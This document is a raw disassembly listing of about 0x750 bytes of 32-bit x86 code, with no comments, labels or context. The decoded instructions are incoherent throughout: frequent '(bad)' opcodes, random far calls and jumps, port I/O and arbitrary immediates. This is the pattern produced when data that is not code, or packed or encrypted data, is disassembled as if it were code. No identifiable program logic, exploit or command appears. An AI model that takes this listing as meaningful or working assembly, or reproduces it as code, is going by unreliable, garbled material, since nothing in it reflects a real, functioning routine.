  41f900:	jge    0x41f93b
  41f902:	loop   0x41f93c
  41f904:	mov    bl,0xd
  41f906:	fs daa 
  41f908:	(bad)  [eax+ebx*1-0x32]
  41f90c:	jo     0x41f96d
  41f90e:	jge    0x41f8a8
  41f910:	lahf   
  41f911:	push   ecx
  41f912:	stos   BYTE PTR es:[edi],al
  41f913:	das    
  41f914:	cwde   
  41f915:	cs cdq 
  41f917:	adc    esp,DWORD PTR [edx]
  41f919:	mov    ds:0x6088b1db,eax
  41f91e:	sub    al,0xe3
  41f920:	aaa    
  41f921:	mov    edx,0x7ecc8a80
  41f926:	push   cs
  41f927:	push   esp
  41f928:	push   edx
  41f929:	cmp    eax,0x358d9a31
  41f92e:	mov    bl,0x82
  41f930:	push   eax
  41f931:	pop    ds
  41f932:	cs int 0x43
  41f935:	jno    0x41f96c
  41f937:	push   DWORD PTR [ebp-0x48b20b38]
  41f93d:	iret   
  41f93e:	xor    DWORD PTR [edx],ecx
  41f940:	mov    al,ds:0xfb3e780e
  41f945:	daa    
  41f946:	adc    esp,esp
  41f948:	aad    0xd1
  41f94a:	mov    edx,DWORD PTR [ebx-0x11]
  41f94d:	lock mov ah,0xab
  41f950:	dec    ecx
  41f951:	pop    ebx
  41f952:	dec    edx
  41f953:	lds    ebp,FWORD PTR [eax]
  41f955:	adc    BYTE PTR [esi-0x3d441f1d],cl
  41f95b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f95c:	cmp    dl,ah
  41f95e:	add    eax,0x1f760239
  41f963:	mov    dh,0x28
  41f965:	(bad)  
  41f966:	neg    DWORD PTR [eax]
  41f968:	mov    dh,0xf1
  41f96a:	setae  BYTE PTR [esi]
  41f96d:	jae    0x41f957
  41f96f:	push   ebp
  41f970:	(bad)  
  41f971:	cld    
  41f972:	jge    0x41f96c
  41f974:	pop    es
  41f975:	xchg   ebx,eax
  41f976:	mov    BYTE PTR [edx],cl
  41f978:	shr    BYTE PTR [eax+0x14],1
  41f97b:	push   ds
  41f97c:	mov    al,ds:0x641d7600
  41f981:	lods   eax,DWORD PTR ds:[esi]
  41f982:	std    
  41f983:	push   eax
  41f984:	cld    
  41f985:	ins    BYTE PTR es:[edi],dx
  41f986:	aas    
  41f987:	inc    esp
  41f988:	lock stos DWORD PTR es:[edi],eax
  41f98a:	or     al,0xde
  41f98c:	cwde   
  41f98d:	adc    al,0x2d
  41f98f:	xor    BYTE PTR [eax+ebp*8],al
  41f992:	icebp  
  41f993:	inc    edi
  41f994:	(bad)  
  41f995:	mov    al,0x22
  41f997:	sub    dl,BYTE PTR [ebp+0x2c]
  41f99a:	test   eax,0xa1ff3cc1
  41f99f:	and    BYTE PTR [ebx+0x35],cl
  41f9a2:	push   esp
  41f9a3:	mov    esi,0xec163430
  41f9a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9a9:	sahf   
  41f9aa:	js     0x41fa13
  41f9ac:	dec    ecx
  41f9ad:	mov    al,0x27
  41f9af:	inc    DWORD PTR [eax]
  41f9b1:	(bad)  
  41f9b2:	mov    bl,0xce
  41f9b4:	jl     0x41f9f1
  41f9b6:	dec    ebp
  41f9b7:	int    0xce
  41f9b9:	xor    DWORD PTR [edi-0x16],edx
  41f9bc:	mov    ebx,0x31948276
  41f9c1:	call   0x9b5b:0x51d163d9
  41f9c8:	(bad)  
  41f9c9:	(bad)  
  41f9cb:	mov    ch,0x4d
  41f9cd:	ja     0x41f9e3
  41f9cf:	dec    eax
  41f9d0:	ja     0x41f968
  41f9d2:	jmp    0x41fa53
  41f9d4:	pop    ss
  41f9d5:	add    BYTE PTR [edx+0x66ebb0f8],ch
  41f9db:	out    0x7c,eax
  41f9dd:	cmp    al,0x7e
  41f9df:	outs   dx,DWORD PTR ds:[esi]
  41f9e0:	push   edx
  41f9e1:	sbb    BYTE PTR [edi],dl
  41f9e3:	pop    eax
  41f9e4:	or     eax,0xedf70c8e
  41f9e9:	add    DWORD PTR [ebx+0x1d957a63],ecx
  41f9ef:	or     al,0x78
  41f9f1:	pop    esp
  41f9f2:	lahf   
  41f9f3:	adc    eax,DWORD PTR [ecx]
  41f9f5:	xchg   edi,eax
  41f9f6:	icebp  
  41f9f7:	or     al,0xb2
  41f9f9:	rol    BYTE PTR [esi-0x4a],0x9a
  41f9fd:	std    
  41f9fe:	cwde   
  41f9ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa00:	xchg   edi,eax
  41fa01:	jmp    0xbcfa:0xc827d60
  41fa08:	adc    DWORD PTR [ebp-0x5100e30d],eax
  41fa0e:	loopne 0x41fa4d
  41fa10:	cmp    BYTE PTR [esi+eiz*4-0x4c],ch
  41fa14:	xor    dl,BYTE PTR [ebx-0x80]
  41fa17:	mov    ebx,0xff20b8a4
  41fa1c:	mov    ds:0xaa290aa,eax
  41fa21:	mov    ds:0x2e55f39b,eax
  41fa26:	mov    cl,0x91
  41fa28:	xchg   BYTE PTR [ecx+0x45d199b2],al
  41fa2e:	mov    edi,0xfca93746
  41fa33:	rol    dh,cl
  41fa35:	inc    si
  41fa37:	pop    es
  41fa38:	pop    ecx
  41fa39:	dec    ecx
  41fa3a:	sbb    DWORD PTR [ebx],ecx
  41fa3c:	and    bl,BYTE PTR [esi+0x50]
  41fa3f:	push   es
  41fa40:	xchg   edi,eax
  41fa41:	pop    es
  41fa42:	test   BYTE PTR fs:[esi+0x1],dh
  41fa46:	pop    ecx
  41fa47:	repnz inc esp
  41fa49:	pop    edx
  41fa4a:	fwait
  41fa4b:	nop
  41fa4c:	jo     0x41fa28
  41fa4e:	call   0x39d5:0x139958d6
  41fa55:	jmp    0xb717fae8
  41fa5a:	xor    al,0xe4
  41fa5c:	xor    al,0xf9
  41fa5e:	fsub   QWORD PTR [eax+ebx*4+0x42e0c2d5]
  41fa65:	jae    0x41fa59
  41fa67:	fs jns 0x41fa83
  41fa6a:	call   eax
  41fa6c:	aas    
  41fa6d:	mov    bl,0x74
  41fa6f:	pop    edx
  41fa70:	dec    edi
  41fa71:	repz in al,dx
  41fa73:	cmp    DWORD PTR [ebp-0x1e2bd938],0xfffffff1
  41fa7a:	mov    al,ds:0x6d7d3cd
  41fa7f:	cmp    bl,BYTE PTR [ebx+0x6]
  41fa82:	popf   
  41fa83:	lods   al,BYTE PTR ds:[esi]
  41fa84:	call   0x494e:0x42874120
  41fa8b:	enter  0xfdb,0x97
  41fa8f:	iret   
  41fa90:	sub    DWORD PTR [eax],ebp
  41fa92:	xchg   esp,eax
  41fa93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa94:	dec    edx
  41fa95:	lea    edi,[edi-0x6a]
  41fa98:	enter  0xabdc,0xda
  41fa9c:	daa    
  41fa9d:	mov    dh,0x8d
  41fa9f:	mov    gs,WORD PTR [esi+0x28]
  41faa2:	cld    
  41faa3:	fdivr  st(7),st
  41faa5:	call   0xa8b6:0xbdf664
  41faac:	push   cs
  41faad:	mov    bh,0x6f
  41faaf:	daa    
  41fab0:	pushf  
  41fab1:	fwait
  41fab2:	mov    ds:0xc8f966f6,eax
  41fab7:	sbb    al,0xc2
  41fab9:	pop    ds
  41faba:	or     eax,DWORD PTR [esi-0x72]
  41fabd:	cmp    eax,0xf21d080b
  41fac2:	add    ebx,DWORD PTR [eax]
  41fac4:	js     0x41fb1b
  41fac6:	mov    edi,0xde948810
  41facb:	ror    DWORD PTR [esi+0x49],cl
  41face:	jo     0x41faa8
  41fad0:	adc    DWORD PTR ds:0x28703722,ebx
  41fad6:	pop    ds
  41fad7:	push   ecx
  41fad8:	mov    eax,ds:0x676d9cc0
  41fadd:	retf   
  41fade:	lods   eax,DWORD PTR ds:[esi]
  41fadf:	jecxz  0x41fb05
  41fae1:	arpl   si,di
  41fae3:	push   cs
  41fae4:	xchg   DWORD PTR [edx-0x6],ecx
  41fae7:	and    dl,bh
  41fae9:	cli    
  41faea:	addr16 je 0x41fb62
  41faed:	lock cwde 
  41faef:	repz inc edi
  41faf1:	jo     0x41fa89
  41faf3:	imul   edx,DWORD PTR [ebx+0x1040addd],0xffffffa9
  41fafa:	dec    edx
  41fafb:	pop    ss
  41fafc:	in     eax,0xa8
  41fafe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faff:	addr16 loopne 0x41fb6e
  41fb02:	cmp    eax,0x3166b285
  41fb07:	push   ss
  41fb08:	cwde   
  41fb09:	hlt    
  41fb0a:	addr16 mov esi,0x3cc83189
  41fb10:	call   0xdb2a46bf
  41fb15:	hlt    
  41fb16:	dec    ecx
  41fb17:	xor    al,0x1e
  41fb19:	xor    al,0x2
  41fb1b:	and    BYTE PTR [eax+0x3f],cl
  41fb1e:	mov    ebx,0x57e3fd5e
  41fb23:	ins    BYTE PTR es:[edi],dx
  41fb24:	shr    edi,0x52
  41fb27:	push   edx
  41fb28:	(bad)  
  41fb29:	mov    ch,0xce
  41fb2b:	aad    0xf5
  41fb2d:	mov    esp,0xf384a6f7
  41fb32:	fisub  WORD PTR [ebx]
  41fb34:	cmp    DWORD PTR ds:0xaaddc9e0,edi
  41fb3a:	xor    BYTE PTR [edx+0x4],al
  41fb3d:	fmul   QWORD PTR [eax+0x16]
  41fb40:	or     edi,DWORD PTR [esi-0x74a3ab0d]
  41fb46:	test   edi,0xff502258
  41fb4c:	mov    ebp,DWORD PTR [edx+edi*8]
  41fb4f:	(bad)  
  41fb50:	test   BYTE PTR [ecx],bh
  41fb52:	dec    esp
  41fb53:	(bad)  
  41fb54:	int    0x93
  41fb56:	out    0xe9,al
  41fb58:	loopne 0x41fb2b
  41fb5a:	pop    ss
  41fb5b:	lea    esp,[esi-0x6ef832bc]
  41fb61:	sub    dl,BYTE PTR [ebp+0x7606fcb7]
  41fb67:	and    dh,BYTE PTR [ecx-0x1d]
  41fb6a:	inc    ebp
  41fb6b:	cwde   
  41fb6c:	pop    esp
  41fb6d:	cmp    DWORD PTR [ebx-0x61],edi
  41fb70:	lock (bad) 
  41fb72:	mov    eax,0x30045873
  41fb77:	(bad)  
  41fb78:	les    eax,FWORD PTR [edx]
  41fb7a:	and    BYTE PTR [eax+0x27698280],bh
  41fb80:	out    0x2e,eax
  41fb82:	jb     0x41fb83
  41fb84:	nop
  41fb85:	adc    eax,0x53b21cdd
  41fb8a:	pop    ebp
  41fb8b:	or     dh,bh
  41fb8d:	xor    al,BYTE PTR [ebx-0x32]
  41fb90:	icebp  
  41fb91:	iret   
  41fb92:	jge    0x41fc09
  41fb94:	(bad)  
  41fb96:	xor    eax,0x6f23d406
  41fb9b:	lods   eax,DWORD PTR ds:[esi]
  41fb9c:	fist   WORD PTR ds:0xbb3c8eae
  41fba2:	test   BYTE PTR [esi+0x71ae2f77],dh
  41fba8:	lock sti 
  41fbaa:	mov    cl,0xc
  41fbac:	and    ebp,DWORD PTR [edi+0x75cf20d7]
  41fbb2:	cmc    
  41fbb3:	cmp    al,0x28
  41fbb5:	in     al,0x6a
  41fbb7:	push   eax
  41fbb8:	sbb    al,0xf3
  41fbba:	dec    edx
  41fbbb:	push   ebp
  41fbbc:	jle    0x41fc0d
  41fbbe:	fcomp  QWORD PTR [esi-0x5539564d]
  41fbc4:	sar    DWORD PTR [esi-0x6bbcfbc9],0x66
  41fbcb:	lea    edi,[esi-0x17a05d8b]
  41fbd1:	mov    eax,ds:0x464868d1
  41fbd6:	jno    0x41fbe2
  41fbd8:	in     eax,0x1a
  41fbda:	fcomp  DWORD PTR [ecx]
  41fbdc:	punpcklwd mm6,DWORD PTR [eax-0x68]
  41fbe0:	sbb    BYTE PTR [edi],0x75
  41fbe3:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41fbe5:	popf   
  41fbe6:	ja     0x41fbee
  41fbe8:	push   ds
  41fbe9:	or     al,0x21
  41fbeb:	xchg   DWORD PTR [esi+ecx*8+0x24],ebx
  41fbef:	out    dx,eax
  41fbf0:	jl     0x41fbd2
  41fbf2:	mov    ecx,0x3f978640
  41fbf7:	out    dx,eax
  41fbf8:	mov    WORD PTR [edi+0x1dcde699],ds
  41fbfe:	cmp    ebx,DWORD PTR [esi+0x5cd2b10]
  41fc04:	push   cs
  41fc05:	mov    dh,0x82
  41fc07:	inc    esi
  41fc08:	and    eax,0xfc348dab
  41fc0d:	ds aam 0x3
  41fc10:	pusha  
  41fc11:	xchg   esp,eax
  41fc12:	aad    0x2
  41fc14:	and    ecx,DWORD PTR [esi-0x1c]
  41fc17:	inc    edx
  41fc18:	pop    esi
  41fc19:	xor    al,0xd8
  41fc1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc1c:	jb     0x41fbd7
  41fc1e:	and    BYTE PTR [esi+0x61],bh
  41fc21:	dec    esp
  41fc22:	jp     0x41fc87
  41fc24:	iret   
  41fc25:	dec    edi
  41fc26:	xchg   edx,eax
  41fc27:	push   ecx
  41fc28:	dec    ecx
  41fc29:	mov    eax,ds:0x94ba75b4
  41fc2e:	mov    dl,0x7e
  41fc30:	add    ah,BYTE PTR [ebp+edi*4-0x2f]
  41fc34:	xchg   esp,eax
  41fc35:	or     DWORD PTR [edi],edi
  41fc37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc38:	mov    BYTE PTR [eax+edi*4+0x4cc67059],0x21
  41fc40:	(bad)  
  41fc41:	ficom  DWORD PTR [ebx+0x3b]
  41fc44:	rcl    BYTE PTR [edx-0x11],1
  41fc47:	rcr    DWORD PTR [ecx],1
  41fc49:	cmp    al,0xdb
  41fc4b:	add    eax,0xaead01ed
  41fc50:	(bad)  
  41fc52:	push   esi
  41fc53:	jmp    0x7728:0x93e17a6e
  41fc5a:	addr16 pusha 
  41fc5c:	cmp    DWORD PTR [esi+eiz*8-0x12c413ac],esp
  41fc63:	sub    dl,dl
  41fc65:	pusha  
  41fc66:	out    dx,al
  41fc67:	popf   
  41fc68:	mov    bl,0x40
  41fc6a:	lock retf 0x1081
  41fc6e:	mov    bl,0x78
  41fc70:	push   ds
  41fc71:	call   0x17bf4c2f
  41fc76:	adc    eax,esp
  41fc78:	or     bl,dl
  41fc7a:	mov    cl,0xaa
  41fc7c:	mul    ebp
  41fc7e:	adc    eax,0xf97ab11e
  41fc83:	push   edx
  41fc84:	rol    edi,0x5e
  41fc87:	jb     0x41fc9d
  41fc89:	repz adc ecx,DWORD PTR [esi-0x6cea9505]
  41fc90:	fs pop ebp
  41fc92:	and    DWORD PTR [ecx],esi
  41fc94:	mov    esi,0xbc5b0476
  41fc99:	popa   
  41fc9a:	mov    eax,ds:0x3d210efe
  41fc9f:	int3   
  41fca0:	fmul   st,st(5)
  41fca2:	out    0x64,eax
  41fca4:	ds inc edi
  41fca6:	xor    eax,0xe60936c0
  41fcab:	inc    ecx
  41fcac:	or     DWORD PTR [edi],ebx
  41fcae:	xor    DWORD PTR [esp-0x12],ebx
  41fcb2:	inc    ebx
  41fcb3:	ins    DWORD PTR es:[edi],dx
  41fcb4:	mov    eax,DWORD PTR [ebp-0x75]
  41fcb7:	into   
  41fcb8:	dec    ecx
  41fcb9:	add    bh,BYTE PTR gs:[esp+ecx*8+0x710a720c]
  41fcc1:	aad    0xd8
  41fcc3:	pop    ebx
  41fcc4:	ins    DWORD PTR es:[edi],dx
  41fcc5:	repnz fstp st(5)
  41fcc8:	push   ds
  41fcc9:	and    BYTE PTR [ebp+0x65],bl
  41fccc:	adc    eax,0xe6bb2e40
  41fcd1:	cld    
  41fcd2:	fstp   DWORD PTR [ebx-0x67]
  41fcd5:	js     0x41fd42
  41fcd7:	out    0xca,al
  41fcd9:	sbb    eax,0x65abc881
  41fcde:	pop    edi
  41fcdf:	lods   al,BYTE PTR ds:[esi]
  41fce0:	push   eax
  41fce1:	test   eax,0x567d3dea
  41fce6:	and    DWORD PTR [eax+ebx*1-0x62],0x50
  41fceb:	(bad)  
  41fced:	int3   
  41fcee:	jl     0x41fd2a
  41fcf0:	jl     0x41fd17
  41fcf2:	sbb    edx,ebp
  41fcf4:	test   edi,ebx
  41fcf6:	jae    0x41fceb
  41fcf8:	jno    0x41fcb2
  41fcfa:	(bad)  
  41fcfb:	jmp    0xc226f5f0
  41fd00:	add    BYTE PTR [edi-0x65d3d936],0x7
  41fd07:	packsswb mm6,QWORD PTR [ebp+eiz*8-0x19]
  41fd0c:	add    eax,0xde526c71
  41fd11:	js     0x41fd76
  41fd13:	add    al,0x87
  41fd15:	scas   al,BYTE PTR es:[edi]
  41fd16:	push   eax
  41fd17:	xor    BYTE PTR [eax+0x3e],bl
  41fd1a:	push   ebx
  41fd1b:	loopne 0x41fd66
  41fd1d:	mov    eax,ds:0xaac6fca8
  41fd22:	dec    edi
  41fd23:	jmp    0x3aec2215
  41fd28:	or     BYTE PTR [eax+0x35],0xc6
  41fd2c:	xchg   edx,edi
  41fd2e:	out    dx,eax
  41fd2f:	ins    BYTE PTR es:[edi],dx
  41fd30:	jbe    0x41fd6b
  41fd32:	test   BYTE PTR [esi],0xc5
  41fd35:	jb     0x41fd15
  41fd37:	mov    ebx,0x6b20fd28
  41fd3c:	mov    dh,0xd4
  41fd3e:	push   esi
  41fd3f:	dec    esp
  41fd40:	dec    edi
  41fd41:	fwait
  41fd42:	fwait
  41fd43:	into   
  41fd44:	lods   eax,DWORD PTR ds:[esi]
  41fd45:	sbb    al,0xb5
  41fd48:	mov    bl,BYTE PTR [ecx+0x1b]
  41fd4b:	loopne 0x41fd4e
  41fd4d:	adc    DWORD PTR [edi+ebx*1-0x6f471070],0xffffffb0
  41fd55:	mov    al,ds:0xcb83a2e0
  41fd5a:	lock and dl,ah
  41fd5d:	out    dx,eax
  41fd5e:	mov    esp,0x383fa56c
  41fd63:	je     0x41fd59
  41fd65:	in     al,dx
  41fd66:	in     al,0xd7
  41fd68:	call   0xc992f7cc
  41fd6d:	and    al,0xd2
  41fd6f:	dec    esi
  41fd70:	aad    0x8f
  41fd72:	ror    BYTE PTR [eax],1
  41fd74:	not    DWORD PTR [edi]
  41fd76:	xor    ch,dl
  41fd78:	dec    ebx
  41fd79:	dec    edx
  41fd7a:	sub    al,0x48
  41fd7c:	sbb    al,0xb6
  41fd7e:	outs   dx,BYTE PTR ds:[esi]
  41fd7f:	(bad)
  41fd83:	test   DWORD PTR [edi],ebx
  41fd85:	pusha  
  41fd86:	inc    ecx
  41fd87:	sbb    al,0x67
  41fd89:	outs   dx,BYTE PTR ds:[esi]
  41fd8a:	shl    BYTE PTR [ebp+0x4],1
  41fd8d:	pushf  
  41fd8e:	cld    
  41fd8f:	mov    esp,0x429e00c5
  41fd94:	and    al,0x9d
  41fd96:	cs mov bl,0x3c
  41fd99:	mov    ah,0x68
  41fd9b:	cmp    BYTE PTR [eax+0x6a],dh
  41fd9e:	cmp    al,0x89
  41fda0:	sbb    bh,ch
  41fda2:	cmp    BYTE PTR fs:[esi],dh
  41fda5:	xor    al,0x44
  41fda7:	cs loopne 0x41fdb7
  41fdaa:	sbb    DWORD PTR [edi+0x4198c608],ebp
  41fdb0:	jl     0x41fdfd
  41fdb2:	inc    esp
  41fdb3:	(bad)  
  41fdb5:	js     0x41fdbd
  41fdb7:	dec    esp
  41fdb8:	mov    dh,0x1e
  41fdba:	sar    al,0x50
  41fdbd:	sub    BYTE PTR [ebx],ah
  41fdbf:	dec    ebx
  41fdc0:	adc    eax,0x45767173
  41fdc5:	dec    ebx
  41fdc6:	and    al,0x8c
  41fdc8:	pop    ss
  41fdc9:	push   ebx
  41fdca:	fwait
  41fdcb:	pop    edx
  41fdcc:	mov    esp,0x4c2ed829
  41fdd1:	adc    al,0x73
  41fdd3:	xor    eax,0xb8323c37
  41fdd8:	pop    eax
  41fdd9:	ja     0x41fe10
  41fddb:	fs adc eax,0xe479209b
  41fde1:	inc    DWORD PTR [eax-0x39]
  41fde4:	xor    esp,DWORD PTR [ebx-0x1]
  41fde7:	xor    cl,BYTE PTR [ebp+edi*2+0x5578b8fb]
  41fdee:	mov    WORD PTR ds:0xd6e99e53,cs
  41fdf4:	xor    cl,0xf2
  41fdf7:	cwde   
  41fdf8:	fdivr  DWORD PTR [ecx-0x461ac8fb]
  41fdfe:	dec    ecx
  41fdff:	mov    esi,0x92b02125
  41fe04:	sbb    al,0x15
  41fe06:	out    dx,eax
  41fe07:	adc    eax,0xc69bec93
  41fe0d:	in     eax,dx
  41fe0e:	fcomp  DWORD PTR [ebx]
  41fe10:	push   0x40
  41fe12:	scas   al,BYTE PTR es:[edi]
  41fe13:	sbb    ebp,DWORD PTR ds:0x2a4582ab
  41fe19:	fld1   
  41fe1b:	or     eax,0x6d085d52
  41fe20:	xchg   esp,eax
  41fe21:	hlt    
  41fe22:	stos   DWORD PTR es:[edi],eax
  41fe23:	cmp    ecx,DWORD PTR [ebp+0x65]
  41fe26:	and    eax,0xbe1eb4c5
  41fe2b:	and    eax,DWORD PTR [edi-0x5b6dbce0]
  41fe31:	jmp    0x41fe5b
  41fe33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe34:	xchg   BYTE PTR [ecx],ah
  41fe36:	push   esp
  41fe37:	hlt    
  41fe38:	cmp    DWORD PTR [ecx-0x7a],ecx
  41fe3b:	in     al,0xd2
  41fe3d:	inc    edi
  41fe3e:	inc    ecx
  41fe3f:	loope  0x41fdc8
  41fe41:	jae    0x41fe72
  41fe43:	xor    eax,0x65
  41fe46:	inc    ecx
  41fe47:	mov    bh,0xe3
  41fe49:	repz push ecx
  41fe4b:	pop    edi
  41fe4c:	call   DWORD PTR [ebx-0x2f]
  41fe4f:	mov    bh,BYTE PTR [eax]
  41fe51:	es mov eax,0xc9239259
  41fe57:	fs gs and al,0x9b
  41fe5b:	stc    
  41fe5c:	cmp    BYTE PTR [ebp+ebp*1-0x3c],0xd0
  41fe61:	popa   
  41fe62:	loopne 0x41fe60
  41fe64:	mov    eax,ds:0xbda17ef6
  41fe69:	mov    esp,cs
  41fe6b:	jg     0x41fe1d
  41fe6d:	aaa    
  41fe6e:	push   ebx
  41fe6f:	xlat   BYTE PTR ds:[ebx]
  41fe70:	jns    0x41fee9
  41fe72:	cmp    eax,0x3e570498
  41fe77:	dec    ebp
  41fe78:	add    al,BYTE PTR [ecx+0x7578660b]
  41fe7e:	xchg   DWORD PTR [ebx+0x38937694],ebx
  41fe84:	cdq    
  41fe85:	mov    al,0x53
  41fe87:	shr    DWORD PTR ds:[edi-0x6e],1
  41fe8b:	pop    esp
  41fe8c:	and    dh,ch
  41fe8e:	loopne 0x41fe75
  41fe90:	inc    eax
  41fe91:	(bad)  [edi-0x60]
  41fe94:	push   eax
  41fe95:	add    dh,BYTE PTR [esi+0xd]
  41fe98:	pop    ecx
  41fe99:	ret    
  41fe9a:	test   al,0xf9
  41fe9c:	push   edi
  41fe9d:	jg     0x41fe40
  41fe9f:	stos   DWORD PTR es:[edi],eax
  41fea0:	dec    edx
  41fea1:	and    eax,0x163e6001
  41fea6:	or     eax,DWORD PTR ds:0x7af7bb49
  41feac:	push   ds
  41fead:	sbb    edi,DWORD PTR [ebp+0x3b]
  41feb0:	cmp    BYTE PTR [eax+eax*8],cl
  41feb3:	add    esp,DWORD PTR [edx-0x69fa7fea]
  41feb9:	ja     0x41ff1d
  41febb:	and    dh,bl
  41febd:	pop    ebx
  41febe:	push   esp
  41febf:	es inc eax
  41fec1:	(bad)  
  41fec2:	sti    
  41fec3:	repnz dec eax
  41fec5:	dec    edi
  41fec6:	xchg   esp,eax
  41fec7:	cdq    
  41fec8:	enter  0x5063,0x1f
  41fecc:	mov    bl,0x13
  41fece:	push   eax
  41fecf:	push   edi
  41fed0:	imul   edi,DWORD PTR [esi+0x66114771],0x27
  41fed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fed8:	or     ch,BYTE PTR [ecx]
  41feda:	sub    al,dl
  41fedc:	outs   dx,DWORD PTR cs:[esi]
  41fede:	outs   dx,DWORD PTR ds:[esi]
  41fedf:	xchg   ebp,eax
  41fee0:	stos   BYTE PTR es:[edi],al
  41fee1:	cwd    
  41fee3:	cmc    
  41fee4:	int    0x17
  41fee6:	add    bh,BYTE PTR [ebx+0x3a7353f1]
  41feec:	pop    ecx
  41feed:	call   0xc9427edc
  41fef2:	arpl   WORD PTR [ecx-0x2264afdf],cx
  41fef8:	sahf   
  41fef9:	lods   al,BYTE PTR ds:[esi]
  41fefa:	xchg   ecx,eax
  41fefb:	iret   
  41fefc:	dec    esp
  41fefd:	sahf   
  41fefe:	cmp    DWORD PTR [edx-0x5219d97d],ebp
  41ff04:	adc    al,0xda
  41ff06:	cwde   
  41ff07:	xchg   edi,eax
  41ff08:	xchg   edi,eax
  41ff09:	pop    ebp
  41ff0a:	(bad)
  41ff0d:	lds    ebx,FWORD PTR [edi-0x2]
  41ff10:	aad    0x8a
  41ff12:	fs pop esp
  41ff14:	out    dx,al
  41ff15:	sbb    eax,0xf9a7b74c
  41ff1a:	sub    DWORD PTR [ebp-0x52],eax
  41ff1d:	mov    bl,0xed
  41ff1f:	in     eax,dx
  41ff20:	jo     0x41ff82
  41ff22:	mov    esi,0xe57db5b5
  41ff27:	mov    ch,0x27
  41ff29:	mov    ds:0x35a5d211,al
  41ff2e:	push   es
  41ff2f:	mov    ebx,0x5ce3e1e
  41ff34:	adc    ecx,DWORD PTR [ebp+0x345ca3f]
  41ff3a:	retf   0xdebc
  41ff3d:	sahf   
  41ff3e:	aaa    
  41ff3f:	jge    0x41ff5f
  41ff41:	or     DWORD PTR [eax+0x47e0ca14],eax
  41ff47:	loope  0x41fede
  41ff49:	jns    0x41fecd
  41ff4b:	pop    ebp
  41ff4c:	rcr    DWORD PTR [esi],cl
  41ff4e:	fdiv   DWORD PTR [ecx]
  41ff50:	cmp    al,0xd0
  41ff52:	fisttp WORD PTR [esi+eiz*8-0x2b]
  41ff56:	xchg   ecx,eax
  41ff57:	and    ecx,DWORD PTR [ebx+0x2b]
  41ff5a:	cwde   
  41ff5b:	test   BYTE PTR [ebp-0x4a],0x14
  41ff5f:	clc    
  41ff60:	sub    ah,BYTE PTR [esp+ebp*2-0x67]
  41ff64:	mov    bh,0x70
  41ff66:	stos   DWORD PTR es:[edi],eax
  41ff67:	xchg   esp,eax
  41ff68:	iret   
  41ff69:	xor    DWORD PTR [ebx+eiz*4-0x3b4a7efe],ecx
  41ff70:	sbb    ebp,ebp
  41ff72:	push   edx
  41ff73:	add    eax,0x29d726f3
  41ff78:	shl    ah,1
  41ff7a:	adc    esi,eax
  41ff7c:	mov    eax,ds:0xd6e9d7ff
  41ff81:	mov    al,ds:0xde2f7283
  41ff86:	fdivr  st(7),st
  41ff88:	iret   
  41ff89:	sbb    al,0x39
  41ff8b:	inc    ebp
  41ff8c:	clc    
  41ff8d:	jmp    0x420009
  41ff8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff90:	mov    ebx,0x566dde54
  41ff95:	pop    eax
  41ff96:	mov    DWORD PTR [edi+esi*1+0x28c938c5],ebx
  41ff9d:	cmc    
  41ff9e:	das    
  41ff9f:	xor    al,ch
  41ffa1:	push   cs
  41ffa2:	mov    ah,0xf5
  41ffa4:	mov    ebx,0xceddb5c8
  41ffa9:	and    eax,0xc0c3a071
  41ffae:	std    
  41ffaf:	aam    0x53
  41ffb1:	xor    BYTE PTR [edx-0x42],bh
  41ffb4:	add    DWORD PTR [ebx],edi
  41ffb6:	inc    ecx
  41ffb7:	leave  
  41ffb8:	cmp    BYTE PTR [edi-0x52f2beb7],ah
  41ffbe:	test   al,0x9e
  41ffc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffc1:	sbb    ah,bh
  41ffc3:	fsub   QWORD PTR es:0xec329714
  41ffca:	sbb    BYTE PTR [edi],al
  41ffcc:	push   esp
  41ffcd:	sbb    BYTE PTR [ecx+eax*1],0x5b
  41ffd1:	ins    BYTE PTR es:[edi],dx
  41ffd2:	arpl   WORD PTR [edx-0x6f70971e],sp
  41ffd8:	rol    DWORD PTR [ecx+0x64],0xab
  41ffdc:	in     al,0x36
  41ffde:	ins    DWORD PTR es:[edi],dx
  41ffdf:	(bad)  
  41ffe0:	fs nop
  41ffe2:	cwde   
  41ffe3:	jecxz  0x42000b
  41ffe5:	xchg   esi,eax
  41ffe6:	sub    BYTE PTR [edx+0x6e],ah
  41ffe9:	out    0x46,al
  41ffeb:	xor    edi,DWORD PTR [ebp+0xc4024ff]
  41fff1:	jb     0x41ffd5
  41fff3:	lea    esp,[eax-0x377c4b7e]
  41fff9:	imul   ecx,DWORD PTR [edi-0x26f8c308],0x279d8d74
  420003:	(bad)  
  420004:	pushf  
  420005:	aas    
  420006:	sbb    al,0x52
  420008:	in     eax,0xed
  42000a:	in     eax,0xf3
  42000c:	pushf  
  42000d:	jmp    0x192015c0
  420012:	or     eax,0x6ec0c8da
  420017:	pop    eax
  420018:	arpl   sp,sp
  42001a:	idiv   BYTE PTR [edx+0x5aac9269]
  420020:	pop    eax
  420021:	xchg   ecx,eax
  420022:	jg     0x41fff3
  420024:	add    BYTE PTR [esi-0x4e],0xe8
  420028:	repnz pop esp
  42002a:	mov    ecx,0x40e34568
  42002f:	nop
  420030:	pop    eax
  420031:	pushf  
  420032:	mov    dh,BYTE PTR [edx+edi*1+0x4e0cc2c2]
  420039:	sbb    eax,0xf5e2d4bd
  42003e:	test   BYTE PTR [esi],0xec
  420041:	(bad)  
  420043:	dec    esp
  420044:	aam    0x16
  420046:	adc    al,0xc4
  420048:	push   edx
  420049:	adc    BYTE PTR [eax+0x62dfdec6],dh
  42004f:	rcl    BYTE PTR fs:[esi],cl
  420052:	in     al,0x9e
  420054:	push   ebp
  420055:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  420057:	or     DWORD PTR [eax],esp
